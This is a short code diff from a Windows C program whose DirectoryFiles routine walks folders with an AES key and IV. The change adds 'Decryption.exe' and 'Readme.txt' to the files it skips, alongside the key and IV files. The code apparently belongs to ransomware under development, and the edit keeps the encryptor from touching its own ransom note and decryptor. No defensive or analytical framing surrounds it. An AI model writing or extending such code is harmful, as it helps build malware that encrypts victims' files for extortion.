@@ -217,7 +217,7 @@ BOOL DirectoryFiles(LPWSTR pDirectoryPath, BYTE* key, BYTE* iv) {
 		if (wcscmp(fileData.cFileName, L".") == 0 || wcscmp(fileData.cFileName, L"..") == 0) {
 			continue;
 		}
-		if (wcscmp(fileData.cFileName, L"IV") == 0 || wcscmp(fileData.cFileName, L"AES_key") == 0 || wcscmp(fileData.cFileName, L"desktop.ini") == 0 || wcscmp(fileData.cFileName, L"AppData") == 0)   {
+		if (wcscmp(fileData.cFileName, L"IV") == 0 || wcscmp(fileData.cFileName, L"AES_key") == 0 || wcscmp(fileData.cFileName, L"desktop.ini") == 0 || wcscmp(fileData.cFileName, L"AppData") == 0 || wcscmp(fileData.cFileName, L"Decryption.exe") == 0 || wcscmp(fileData.cFileName, L"Readme.txt") == 0) {
 			wprintf(L"%s Skipped\n", fileData.cFileName);
 			continue;
 		}
